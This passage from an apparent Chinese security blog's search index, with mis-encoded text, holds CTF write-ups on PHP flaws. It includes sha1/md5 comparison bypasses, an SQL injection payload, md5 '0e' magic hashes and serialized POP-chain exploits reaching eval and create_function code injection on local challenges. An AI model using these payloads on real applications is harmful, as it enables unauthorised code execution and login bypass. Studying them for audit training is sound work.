if ($_GET['name'] == $_GET['password']) echo '&lt;p&gt;Your password can not be your name!&lt;/p&gt;'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else echo '&lt;p&gt;Invalid password.&lt;/p&gt;';}else echo '&lt;p&gt;Login first!&lt;/p&gt;';?&gt; æ¼æ´åˆ†æsha1()å‡½æ•°è®¡ç®—å­—ç¬¦ä¸²sha-1æ•£åˆ—ï¼Œæ¥å—å‚æ•°ä½å­—ç¬¦ä¸²ç±»å‹ === ä¸ºæ’ç­‰å¼ä¼šå¯¹å˜é‡ç±»å‹è¿›è¡Œæ¯”è¾ƒ è‹¥ä¼ å…¥å˜é‡ä¸ºæ•°ç»„ç±»å‹ï¼Œå°±ä¼šä½¿sha1å‡½æ•°è¿”å›é”™è¯¯ï¼Œå³falseï¼›éƒ½æŠ¥é”™çš„æƒ…å†µä¸‹ï¼Œ æ’ç­‰å¼å³æˆç«‹ æ¼æ´åˆ©ç”¨payload:?name[]=1&amp;passwordp[]=2 sessionéªŒè¯ç»•è¿‡æ¼æ´æºç 1234567891011121314&lt;?phpinclude 'flag.php';highlight_file(__FILE__);session_start(); if (isset ($_GET['password'])) { if ($_GET['password'] == $_SESSION['password']) die ('Flag: '.$flag); else print '&lt;p&gt;Wrong guess.&lt;/p&gt;';}mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt; æ¼æ´åˆ†æè‹¥sessioné‡Œçš„passwordçš„å€¼å’Œgetä¼ å‚è¿›å»çš„å€¼ç›¸ç­‰ï¼Œåˆ™ä¼šè¾“å‡ºflagï¼› å¯¹å…¶$_SESSION[â€˜passwordâ€™]è¿›è¡Œè¾“å‡ºå‘ç°ç»“æœä¸ºnullï¼Œæ‰€ä»¥è¿™é‡Œæ„é€ passwordä¼ å…¥ç©ºå€¼ï¼Œä½¿å…¶ç›¸ç­‰ï¼› æ¼æ´åˆ©ç”¨payload:?password= md5æ¯”è¾ƒç»•è¿‡æ¼æ´æºç 1234567891011121314151617181920212223242526&lt;?php include 'flag.php'; if($_POST['user'] &amp;&amp; $_POST['pass']) { $conn = mysql_connect(&quot;localhost&quot;, &quot;ctf&quot;, &quot;ctf&quot;); mysql_select_db(&quot;md5bypass&quot;) or die(&quot;Could not select database&quot;); if ($conn-&gt;connect_error) { die(&quot;Connection failed: &quot; . mysql_error($conn)); } $user = $_POST['user']; $pass = md5($_POST['pass']); $sql = &quot;select pw from php where user='$user'&quot;; $query = mysql_query($sql); if (!$query) { printf(&quot;Error: %s\\n&quot;, mysql_error($conn)); exit(); } $row = mysql_fetch_array($query, MYSQL_ASSOC); if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) { echo &quot;&lt;p&gt;Logged in!&quot; . $flag . &quot;&lt;/p&gt;&quot;; } else { echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); } }?&gt; æ¼æ´åˆ†æstrcasecmp(string1, string2) å‡½æ•°æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ã€‚å¦‚æœç›¸ç­‰è¿”å›0ï¼Œå¦‚æœstring1&lt;string2è¿”å›&lt;0,å¦‚æœstring1&gt;string2è¿”å›&gt;0 æç¤ºï¼šstrcasecmp() å‡½æ•°æ˜¯äºŒè¿›åˆ¶å®‰å…¨çš„ï¼Œä¸”ä¸åŒºåˆ†å¤§å°å†™ã€‚ æ ¹æ®ä»£ç åªè¦è®©$row[pw]ä¸å˜é‡$passç›¸ç­‰å³å¯è¾“å‡ºflagï¼› $passæ˜¯ç»è¿‡md5ä¹‹åçš„å€¼ï¼Œè¿™ä¸ªå€¼ç”¨æˆ·å¯ä»¥é€šè¿‡è¾“å…¥æ§åˆ¶ï¼› $row[pw]çš„å€¼æ˜¯é€šè¿‡sqlæŸ¥è¯¢è·å–åˆ°ï¼› é€šè¿‡ä»£ç å¾ˆæ˜æ˜¾å¯ä»¥çœ‹å‡ºæ¥ï¼Œåœ¨userå˜é‡å¤„æ²¡æœ‰ä»»ä½•è¿‡æ»¤å­˜åœ¨ï¼Œæ˜¯æ˜æ˜¾å­˜åœ¨æ³¨å…¥çš„ï¼› é€šè¿‡æ³¨å…¥æ„é€ æ§åˆ¶$row[pw]ä¸ºç”¨æˆ·è‡ªå·±è¾“å…¥çš„md5å€¼å³å¯ï¼Œpassçš„å€¼å¯æ§ï¼Œç›´æ¥è¾“å…¥å¯¹åº”md5çš„æ˜æ–‡å³å¯ï¼› æ¼æ´åˆ©ç”¨payload:admin' AND 0=1 union select '202cb962ac59075b964b07152d234b70'#&amp;pass=123 md5åŠ å¯†ç›¸ç­‰ç»•è¿‡æ¼æ´æºç 12345678910111213141516&lt;?phpinclude 'flag.php';highlight_file(__FILE__);$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a)){if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) { echo &quot;flag:&quot; . $flag;} else { echo &quot;false!!!&quot;;}}else{echo &quot;please input a&quot;;}?&gt; æ¼æ´åˆ†æphpä¸­md5å€¼è‹¥æ˜¯0eå¼€å¤´ï¼Œé‚£ä¹ˆä¸å…¶ä»–çš„0eå¼€å¤´çš„md5å€¼ç›¸ç­‰ï¼Œè¿™ä¹Ÿæˆä¸ºmd5ç¢°æ’ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199aæ‰€ä»¥éšä¾¿æŒ‘ä¸€ä¸ª0eå¼€å¤´çš„md5å¯¹åº”çš„åŸç  æ„é€  playloadå³å¯ æ¼æ´åˆ©ç”¨payload:?a=s878926199a","link":"/2019/03/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/php-code-audit/php-features/"},{"title":"phpååºåˆ—åŒ–ä¹‹é­”æ³•å‡½æ•°clone","text":"å‰å¥æ˜¨å¤©æŸç”²æ–¹å®¢æˆ·è”ç³»æˆ‘ï¼Œç›´æ¥ç”©äº†ä¸¤é“phpååºåˆ—åŒ–çš„æºç é¢˜ï¼Œæ™šä¸Šå›å»æŠŠé¢˜ç›®æœ¬åœ°å¤ç°äº†ä¸€ä¸‹ã€‚è¿™ä¸ªå¤ç°ä¹‹è·¯å¯è°“è‰°è¾›ã€‚phpstudyç›´æ¥æŠ¥é”™ï¼Œæ¯ä¸€è¡Œéƒ½æŠ¥é”™ã€‚åé¢æ‰çŸ¥é“ï¼Œå› ä¸ºç›´æ¥ä»¥æºç æ–¹å¼å¾®ä¿¡å‘çš„ï¼Œæˆ‘ç›´æ¥å¤åˆ¶ï¼Œå¯¼è‡´å¤åˆ¶çš„ä¸å¹²å‡€ï¼Œæºæ‚äº†ä¸€äº›è„ä¸œè¥¿ã€‚æ­¤å¤„å·²å¿ƒæ€çˆ†ç‚¸ï¼Œæˆ‘æŠŠæºç æ‰‹æ’¸äº†ä¸€éã€‚o(â•¯â–¡â•°)oå¹¸å¥½æºç ä¸æ˜¯å¤ªå¤šã€‚ç¬¬ä¸€é¢˜è€½è¯¯äº†å¤ªå¤šæ—¶é—´æ²¡æå‡ºæ¥ï¼Œç¬¬äºŒé¢˜å‡ºæ¥äº†ï¼Œè¿™è¾¹æƒ³ç€åšä¸ªç®€å•è®°å½•å§ã€‚ åˆ†æé¢˜ç›®æºç é‡Œé¢çš„æ³¨é‡Šå†…å®¹ä¸ºæˆ‘æœ¬åœ°è¿è¡Œæ—¶æ·»åŠ çš„æµ‹è¯•ä»£ç ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php class z{ public $a; function __toString(){ //echo &quot;class z tostring&quot;; return $this-&gt;a-&gt;b['a']; } } class h { public $method; function __call($method,$arg){ //echo &quot;class h&quot;; //echo &quot;123&quot;.$method; //echo &quot;456&quot;.$this-&gt;method; var_dump($arg); if(in_array($method, $this-&gt;method)){ eval(array_shift($arg)); } } } class e { public $z; public $f; public $arg; function __get($p){ $this-&gt;xixi=clone $this-&gt;z; return &quot;haha&quot;; } public function __clone() { //echo &quot;__clone&quot;; //var_dump($this-&gt;f); return $this-&gt;f-&gt;haha($this-&gt;arg); } } if (isset($_GET['poc'])){ echo unserialize($_GET['poc']); }else{ highlight_file(__FILE__); }?&gt; å‰ç½®çŸ¥è¯†å…¶å®ä»£ç å†…å®¹å¹¶ä¸å¤š ä½†æ˜¯è¿™é‡Œé¢çš„é­”æ³•å‡½æ•°__cloneä»¥åŠå‡½æ•°cloneæ˜¯æˆ‘ç¬¬ä¸€æ¬¡è§ï¼Œè¿™é‡ŒçœŸçš„è¯´æ˜è‡ªå·±æœ‰ç‚¹èœï¼Œé¢˜åšçš„å¤ªå°‘å•Š~ æ—¶é—´éƒ½ç”¨æ¥æ‰“æ‚äº†ï¼Œæˆ‘ä¸€å¼€å§‹æŠŠå®ƒè®¤ä¸ºæ˜¯è‡ªå®šä¹‰å‡½æ•°äº†ã€‚ã€‚ã€‚ æ²¡ç”¨è¿‡å’‹åŠå‘¢ï¼Œ æŸ¥å‘—ï¼Œgoogleèµ°èµ·ã€‚ åˆ«é—®æˆ‘ä¸ºå•¥ä¸ç™¾åº¦ï¼Œå…¶å®ä½ ä»¬éƒ½æ‡‚å¾—~ ç½‘ä¸Šç»™äº†ä¸€ä¸ªå°æ —å­æ¼”ç¤ºäº†ä¸€ä¸‹è¿™ä¸ªé­”æ³•å‡½æ•°çš„ä½œç”¨ï¼š 123456789101112131415161718&lt;?php //é¦–å…ˆå®šä¹‰ä¸€ä¸ªtestä¸€ä¸ªç±» class Testclass { //æˆå‘˜å˜é‡æ˜¯$value1 public $value1; } //éšånewä¸€ä¸ªobj1 $obj1 = new Testclass(); //å¤åˆ¶æˆå‘˜å˜é‡çš„å€¼ä¸ºqqq $obj1-&gt;value1 = &quot;qqq&quot;; //æˆ‘ä»¬ä½¿ç”¨èµ‹å€¼ç¬¦å·ç»™å·¦è¾¹obj2èµ‹å€¼obj1 $obj2 = $obj1; //æˆ‘ä»¬åœ¨è¿™é‡ŒæŠŠobj2çš„çš„value1å¤åˆ¶ä¸ºeee $obj2-&gt;value1 =&quot;eee&quot;; //éšåæˆ‘ä»¬æ‰“å°å‡ºä¸¤è€…çš„å€¼ var_dump($obj1); echo '&lt;br/&gt;'; var_dump($obj2); output: 12object(Testclass)#1 (1) { [&quot;value1&quot;]=&gt; string(3) &quot;eee&quot; }object(Testclass)#1 (1) { [&quot;value1&quot;]=&gt; string(3) &quot;eee&quot; } æˆ‘ä»¬å‘ç°è¿™ç§æƒ…å†µä¸‹è¿è¡Œç»“æœä¸€è‡´ï¼š é‚£æ˜¯å› ä¸ºï¼ˆå€Ÿç”¨phpæ‰‹å†Œçš„è¯å°±æ˜¯ï¼‰ï¼šå½“å¯¹è±¡è¢«å¤åˆ¶åï¼ŒPHP 5 ä¼šå¯¹å¯¹è±¡çš„æ‰€æœ‰å±æ€§æ‰§è¡Œä¸€ä¸ªæµ…å¤åˆ¶ï¼ˆshallow copyï¼‰ã€‚æ‰€æœ‰çš„å¼•ç”¨å±æ€§ ä»ç„¶ä¼šæ˜¯ä¸€ä¸ªæŒ‡å‘åŸæ¥çš„å˜é‡çš„å¼•ç”¨ã€‚ å…¶å®åœ¨è¿™é‡Œå°±æ˜¯obj1ç»™äº†obj2å®ƒçš„åœ°å€ï¼Œå°±å’Œå¼•ç”¨ä¸€æ ·ï¼Œobj2æŒ‡å‘äº†obj1 æ¥ä¸‹æ¥ä½¿ç”¨cloneå¤åˆ¶ 12è¿™é‡Œè®²ä¸Šè¿°ä»£ç ä¸­$obj2 = $obj1; =ã€‹ $obj2 = clone $obj1; output: 12object(Testclass)#1 (1) { [&quot;value1&quot;]=&gt; string(3) &quot;qqq&quot; }object(Testclass)#2 (1) { [&quot;value1&quot;]=&gt; string(3) &quot;eee&quot; } å…¶å®è¿™é‡Œçš„cloneå°±æ˜¯ä¸ºäº†å®ç°æ·±æ‹·è´çš„ä½œç”¨ã€‚ __cloneè§¦å‘æ¡ä»¶ï¼šå½“æˆ‘ä»¬å¯¹ä¸€ä¸ªç±»æœ‰cloneæ“ä½œçš„æ—¶å€™å°†ä¼šè§¦å‘è¿™ä¸ªç±»é‡Œé¢çš„__cloneæ–¹æ³• æ³¨ï¼šcloneåªèƒ½ç”¨äºå¯¹è±¡å…‹éš†ï¼Œå¯¹è±¡å¤åˆ¶ã€‚å¦‚æœcloneä¸€ä¸ªéå¯¹è±¡å˜é‡å°†ä¼šæŠ¥é”™no obj å…·ä½“å¼€å¹²å…¶å®åˆ°è¿™é‡Œæˆ‘ä»¬åŸºæœ¬ä¸Šç¨€é‡Œç³Šæ¶‚çš„æˆ–è®¸å¤§æ¦‚æ˜ç™½äº†ä»€ä¹ˆæ„æ€ã€‚ã€‚ã€‚é‚£å°±å¼€æå‘—ã€‚æœ‰æºç ï¼Œä¸€ç‚¹ç‚¹åˆ†æå¥½äº† æˆ‘çš„æ€è·¯è¿™ç§ç®€çŸ­çš„æºç ï¼Œæˆ‘å–œæ¬¢å…ˆå®šä½å±é™©å‡½æ•°å†å»åæ¨POPé“¾ ä»£ç ä¸­æˆ‘ä»¬å‘ç°å±é™©å‡½æ•°evalè—åœ¨ç±»hçš„__callä¸­ï¼Œä¸”è¦ä¿è¯æ¡ä»¶in_array($method, $this-&gt;method)æˆç«‹,è¿™é‡Œå¯ä»¥ç›´æ¥æ§åˆ¶$method = arry('haha','hehe','dada'); è°ƒç”¨__callé­”æ³•å‡½æ•°åªéœ€è°ƒç”¨å…¶å®ä¾‹åŒ–ç±»æœ¬èº«ä¸å­˜åœ¨çš„æ–¹æ³•å³å¯ï¼Œåˆšå¥½åœ¨ç±»eä¸­å­˜åœ¨æˆå‘˜å˜é‡hè°ƒç”¨äº†ä¸€ä¸ªhahaæ–¹æ³•ï¼Œè¯¥æ–¹æ³•åˆšå¥½æ˜¯ç±»hä¸å­˜åœ¨çš„,å³$obj = new e;$obj-&gt;f=new h; è¦æƒ³è§¦å‘ä»¥ä¸Šæ¡ä»¶å°±éœ€è¦è§¦å‘__cloneé­”æ³•å‡½æ•°ï¼Œæ ¹æ®å‰åºåªæ˜¯æˆ‘ä»¬çŸ¥é“ï¼Œcloneå³å¯è§¦å‘,ä¸”cloneæ˜¯åœ¨__geté­”æ³•å‡½æ•°ä¸­,å³$obj = new z;$obj-&gt;a = new e; è§¦å‘__geté­”æ³•å‡½æ•°ï¼Œåªéœ€è°ƒç”¨å…¶å®ä¾‹åŒ–ç±»å¯¹è±¡ä¸­ä¸å­˜åœ¨æˆ–è€…æ— æƒé™è°ƒç”¨çš„æˆå‘˜å±æ€§å³å¯ åˆšå¥½åœ¨ç±»zä¸­å­˜åœ¨__toStringé­”æ³•å‡½æ•°ï¼Œé‡Œé¢æ‰§è¡Œäº†æˆå‘˜å˜é‡å¼•ç”¨ï¼Œé‚£ä¹ˆ$a = new eå³å¯ ä¼ å‚æ¥å£pocåˆšå¥½åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è¢«echoäº†ï¼Œé‚£ä¹ˆåˆšå¥½å¯ä»¥ç›´æ¥è§¦å‘__toString æ„é€ expæ ¹æ®åˆ†æå…·ä½“æ€è·¯æ„é€ ä¸€ä¸ªå®Œç¾çš„expå³å¯ 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php class z{ public $a; function __toString(){ return $this-&gt;a-&gt;b['a']; } } class h { public $method = array(&quot;haha&quot;,&quot;hehe&quot;,&quot;dada&quot;); function __call($method,$arg){ if(in_array($method, $this-&gt;method)){ eval(array_shift($arg)); } } } class e { public $z; public $f; public $arg = &quot;phpinfo();&quot;; function __get($p){ $this-&gt;xixi=clone $this-&gt;z; return &quot;haha&quot;; } public function __clone() { return $this-&gt;f-&gt;haha($this-&gt;arg); } } $obj = new z; $obj-&gt;a = new e; //è§¦å‘__get $obj-&gt;a-&gt;z = $obj-&gt;a; //__clone çš„æ·±æ‹·è´ç”¨æ³• $obj-&gt;a-&gt;z-&gt;f = new h; //èµ‹å€¼å®ä¾‹åŒ–hç±»ï¼Œ è§¦å‘__call $poc = serialize($obj); //echo $poc; echo urlencode($poc); outputï¼š 12O:1:&quot;z&quot;:1:{s:1:&quot;a&quot;;O:1:&quot;e&quot;:3:{s:1:&quot;z&quot;;r:2;s:1:&quot;f&quot;;O:1:&quot;h&quot;:1:{s:6:&quot;method&quot;;a:3:{i:0;s:4:&quot;haha&quot;;i:1;s:4:&quot;hehe&quot;;i:2;s:4:&quot;dada&quot;;}}s:3:&quot;arg&quot;;s:10:&quot;phpinfo();&quot;;}}O%3A1%3A%22z%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22e%22%3A3%3A%7Bs%3A1%3A%22z%22%3Br%3A2%3Bs%3A1%3A%22f%22%3BO%3A1%3A%22h%22%3A1%3A%7Bs%3A6%3A%22method%22%3Ba%3A3%3A%7Bi%3A0%3Bs%3A4%3A%22haha%22%3Bi%3A1%3Bs%3A4%3A%22hehe%22%3Bi%3A2%3Bs%3A4%3A%22dada%22%3B%7D%7Ds%3A3%3A%22arg%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D åˆ©ç”¨1http://127.0.0.1/timu2.php?poc=O%3A1%3A%22z%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22e%22%3A3%3A%7Bs%3A1%3A%22z%22%3Br%3A2%3Bs%3A1%3A%22f%22%3BO%3A1%3A%22h%22%3A1%3A%7Bs%3A6%3A%22method%22%3Ba%3A3%3A%7Bi%3A0%3Bs%3A4%3A%22haha%22%3Bi%3A1%3Bs%3A4%3A%22hehe%22%3Bi%3A2%3Bs%3A4%3A%22dada%22%3B%7D%7Ds%3A3%3A%22arg%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D","link":"/2021/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/php-code-audit/php-unserialize-clone/"},{"title":"php-unserialize-getflag","text":"é¢˜ç›®æºç 1234567891011121314151617181920212223242526272829&lt;?phperror_reporting(0);highlight_file(__FILE__);$pwd=getcwd();class func{ public $mod1; public $mod2; public $key; public function __destruct() { unserialize($this-&gt;key)(); $this-&gt;mod2 = &quot;welcome &quot;.$this-&gt;mod1; } }class GetFlag{ public $code; public $action; public function get_flag(){ $a=$this-&gt;action; $a('', $this-&gt;code); }}unserialize($_GET[0]);?&gt; é¢˜ç›®åˆ†æphpååºåˆ—åŒ–çœŸè¦è¢«ctfç»™ç©çƒ‚äº† è¿™é“é¢˜çš„ä»£ç ä¸å¤šï¼Œä½†æ˜¯åæ­£æˆ‘æ˜¯ä¸ä¼š é€»è¾‘æ€è·¯æ˜¯æœ‰ï¼Œä½†æ˜¯ä¸ä¼šæ„é€ çš„ï¼Œæ¥ä¸‹æ¥å°±ç®€å•çš„åˆ†æä¸€ä¸‹å§ åˆ©ç”¨ç±»funcä¸­çš„__destruct()é­”æ³•å‡½æ•°ï¼Œè°ƒç”¨è§¦å‘ç±»GetFlagä¸­get_flagæ–¹æ³•ï¼Œæ ¹æ®$a('', $this-&gt;code);è¿™è¡Œä»£ç ï¼Œå¯ä»¥æ„é€ create_functionå‡½æ•°è§¦å‘ï¼Œé€»è¾‘éƒ½å¾ˆç®€å•ã€‚è¿™é‡Œå”¯ç‹¬å°±æ˜¯ä¸çŸ¥é“æ€ä¹ˆç»™ç±»funcä¸­çš„keyæ„é€ ä¼ å‚ åé¢æ‰çŸ¥é“å¯ä»¥è¿™ä¹ˆä¼ å‚ï¼š$key = serialize([new GetFlag(), &quot;get_flag&quot;]); æ„é€ åˆ©ç”¨123456789101112131415161718192021222324252627282930&lt;?php class func { public $mod1; public $mod2; public $key; public function __destruct() { unserialize($this-&gt;key)(); $this-&gt;mod2 = &quot;welcome &quot;.$this-&gt;mod1; } } class GetFlag { public $code = &quot;;}phpinfo();//&quot;; public $action = 'create_function'; public function get_flag(){ $a=$this-&gt;action; $a('', $this-&gt;code); } } $obj = new func(); $obj-&gt;key = serialize([new GetFlag(), &quot;get_flag&quot;]); echo serialize($obj); ?&gt; outputï¼š 1http://127.0.0.1/10279.php?0=O:4:%22func%22:3:{s:4:%22mod1%22;N;s:4:%22mod2%22;N;s:3:%22key%22;s:116:%22a:2:{i:0;O:7:%22GetFlag%22:2:{s:4:%22code%22;s:14:%22;}phpinfo();//%22;s:6:%22action%22;s:15:%22create_function%22;}i:1;s:8:%22get_flag%22;}%22;}","link":"/2021/12/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/php-code-audit/php-unserialize-getflag/"},{"title":"phpååºåˆ—åŒ–æ¼æ´è§£æ","text":"PHPååºåˆ—åŒ–æ¼æ´åºåˆ—åŒ–ä¸ååºåˆ—åŒ–PHPçš„åºåˆ—åŒ–phpåºåˆ—åŒ–å°±æ˜¯å°†å„ç§ç±»å‹çš„æ•°æ®ï¼Œå‹ç¼©å¹¶æŒ‰ç…§ä¸€å®šçš„æ ¼å¼è¿›è¡Œå­˜å‚¨çš„è¿‡ç¨‹ã€‚å…¶æœ¬è´¨å°±æ˜¯å°†å¯¹è±¡æ•°æ®ç±»å‹è½¬æ¢æˆå­—ç¬¦ä¸²çš„æ•°æ®ç±»å‹ï¼Œæ–¹ä¾¿äºå¯¹è±¡çš„ä¼ é€’ã€‚ å‡½æ•°:serialize() ä»£ç å®ä¾‹: 123456789101112&lt;?php class SerializeDemo { public $a = &quot;public&quot;; private $b = &quot;private&quot;; protected $c = &quot;protected&quot;; public function get_public() { echo $this-&gt;a; } } $data = new SerializeDemo(); echo serialize($data);?&gt; è¾“å‡ºç»“æœï¼š ç»“æœåˆ†æï¼š Oï¼šä»£è¡¨è¿™æ˜¯ä¸€ä¸ªå¯¹è±¡ 13ï¼šä»£è¡¨å¯¹è±¡åç§°å 13ä¸ªå­—ç¬¦ SerializeDemoï¼šä»£è¡¨å¯¹è±¡åç§° 3ï¼šä»£è¡¨å¯¹è±¡æœ‰3ä¸ªå±æ€§ s:ä»£è¡¨å±æ€§çš„ç±»å‹str 1ï¼šä»£è¡¨å±æ€§åç§°é•¿åº¦ä¸º1å­—ç¬¦ aï¼šä»£è¡¨å±æ€§åç§° sï¼šä»£è¡¨å±æ€§å€¼ç±»å‹ä¸ºstr 6ï¼šä»£è¡¨å±æ€§å€¼å 6ä¸ªå­—ç¬¦ publicï¼šä»£è¡¨å±æ€§å€¼ æ³¨ï¼šæ ¹æ®ç»“æœæˆ‘ä»¬å¯ä»¥å‘ç°è¿™é‡Œé¢çš„ä¸‰ä¸ªå±æ€§çš„æ ‡è¯†ç»“æœå‡ä¸ç›¸åŒï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ PHPåºåˆ—åŒ–ä¸­çš„æƒé™æ ¹æ®ä¸Šè¿°å®ä¾‹æˆ‘ä»¬å‘ç°ï¼Œå±æ€§båœ¨åºåˆ—åŒ–ä¹‹åå˜æˆäº†SerializeDemob,é•¿åº¦ä¹Ÿä¸çœŸå®å­—ç¬¦æ•°é‡ä¸ä¸€è‡´ï¼›å¹¶ä¸”å±æ€§cä¹Ÿä¸ç›¸åŒï¼Œå‰é¢å¤šäº†ä¸€ä¸ª*ã€‚å‘ç”Ÿæ­¤ç§ç°è±¡çš„åŸå› ä¸»è¦æ˜¯ç”±äºæˆå‘˜å˜é‡å±æ€§çš„å±æ€§ä¸åŒæ‰€å¯¼è‡´çš„ã€‚åºåˆ—åŒ–ä¸ºäº†èƒ½æŠŠæ•´ä¸ªç±»å¯¹è±¡çš„å„ç§ä¿¡æ¯å®Œå®Œæ•´æ•´çš„å‹ç¼©ã€æ ¼å¼åŒ–ï¼Œå¿…é¡»ä¹Ÿè¦å¯¹å…¶å±æ€§çš„æƒé™è¿›è¡Œåºåˆ—åŒ–ã€‚é’ˆå¯¹äºæ­¤ç§æƒ…å†µï¼Œæˆ‘ä»¬å…·ä½“æ¥çœ‹ä¸€ä¸‹publicã€privateã€protectedä¸‰ç§å±æ€§çš„å…·ä½“è¡¨ç°æƒ…å†µï¼š public è¯¥æƒé™åºåˆ—åŒ–æ—¶ï¼Œè¯¥æ˜¯å‡ ä¸ªå­—ç¬¦å°±æ˜¯å‡ ä¸ªå­—ç¬¦ private è¯¥æƒé™æ˜¯ç§æœ‰å±æ€§ï¼Œç§æœ‰æƒé™çš„ç‰¹å¾æ˜¯è¯¥ç±»å¯¹å…¶ç§æœ‰å±æ€§å…·æœ‰å¼ºçƒˆå æœ‰æ¬²ï¼Œæ‰€ä»¥ä¼šåœ¨å…¶ç§æœ‰å±æ€§å‰å¢åŠ è‡ªå·±çš„ç±»å;å¤šå‡ºæ¥çš„ä¸¤ä¸ªå­—ç¬¦ä¸ºç©ºç™½ç¬¦ï¼Œä¹Ÿå°±æ˜¯%00ï¼Œæœ€ç»ˆçš„è¡¨ç°å½¢å¼ä¸ºï¼š%00ç±»å%00å±æ€§å protected è¯¥å±æ€§ä¸ºå—ä¿æŠ¤æƒé™ï¼Œåºåˆ—åŒ–æ—¶çš„å˜ç°å½¢å¼ä¸ºï¼š%00*%00å±æ€§å PHPåºåˆ—åŒ–çš„å†…å®¹æ ¹æ®å‰é¢åºåˆ—åŒ–çš„å®ä¾‹æˆ‘ä»¬å‘ç°ï¼Œæ•´ä¸ªåºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œåªä¼šå¯¹å…¶ç±»çš„å±æ€§å†…å®¹è¿›è¡Œåºåˆ—åŒ–ä¿å­˜ï¼Œä¸ä¼šå¯¹å…¶æ–¹æ³•è¿›è¡Œåºåˆ—åŒ–ã€‚ åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¸€å®šè¦ä¿è¯åœ¨å½“å‰çš„ä½œç”¨åŸŸç¯å¢ƒä¸‹æœ‰è¯¥ç±»å­˜åœ¨; ååºåˆ—åŒ–å°±æ˜¯å°†æˆ‘ä»¬å‹ç¼©æ ¼å¼åŒ–çš„å¯¹è±¡è¿˜åŸæˆåˆå§‹çŠ¶æ€çš„è¿‡ç¨‹ï¼ˆå¯ä»¥è®¤ä¸ºæ˜¯è§£å‹ç¼©çš„è¿‡ç¨‹ï¼‰ï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰åºåˆ—åŒ–æ–¹æ³•ï¼Œå› æ­¤åœ¨ååºåˆ—åŒ–ä»¥åæˆ‘ä»¬å¦‚æœæƒ³æ­£å¸¸ä½¿ç”¨è¿™ä¸ªå¯¹è±¡çš„è¯æˆ‘ä»¬å¿…é¡»è¦ä¾æ‰˜äºè¿™ä¸ªç±»è¦åœ¨å½“å‰ä½œç”¨åŸŸå­˜åœ¨çš„æ¡ä»¶ã€‚ åœ¨ååºåˆ—åŒ–æ”»å‡»çš„æ—¶å€™ä¹Ÿå°±æ˜¯ä¾æ‰˜ç±»å±æ€§è¿›è¡Œæ”»å‡»; å› ä¸ºæ²¡æœ‰åºåˆ—åŒ–æ–¹æ³•ï¼Œèƒ½æ§åˆ¶çš„åªæœ‰ç±»çš„å±æ€§ï¼Œå› æ­¤ç±»å±æ€§å°±æ˜¯å”¯ä¸€çš„æ”»å‡»å…¥å£ã€‚åœ¨çš„æ”»å‡»æµç¨‹ä¸­ï¼Œå°±æ˜¯è¦å¯»æ‰¾åˆé€‚çš„èƒ½è¢«æˆ‘ä»¬æ§åˆ¶çš„å±æ€§ï¼Œç„¶ååˆ©ç”¨å®ƒæœ¬èº«çš„å­˜åœ¨çš„æ–¹æ³•ï¼Œåœ¨åŸºäºå±æ€§è¢«æ§åˆ¶çš„æƒ…å†µä¸‹å‘åŠ¨æˆ‘ä»¬çš„ååºåˆ—åŒ–æ”»å‡»ã€‚ PHPçš„ååºåˆ—åŒ–ååºåˆ—åŒ–å°±æ˜¯å°†åŸæœ¬åºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸²æ ¼å¼è¿˜åŸæˆçš„åˆå§‹å¯¹è±¡çš„è¿‡ç¨‹ï¼›ä½¿å¯¹è±¡æ•°æ®é•¿ä¹…ä¿å­˜ï¼Œå¯ä»¥åœ¨éšæ—¶æƒ³è°ƒç”¨çš„æ—¶å€™å°±å¯ä»¥è°ƒç”¨ã€‚ å‡½æ•°:unserialize() ä»£ç å®ä¾‹: 12345678910111213&lt;?php class SerializeDemo { public $a = &quot;public&quot;; private $b = &quot;private&quot;; protected $c = &quot;protected&quot;; public function get_public() { echo $this-&gt;a; } } $data = file_get_contents(&quot;serialize.txt&quot;); $data = unserialize($data); $data-&gt;get_public();?&gt; serialize.txt 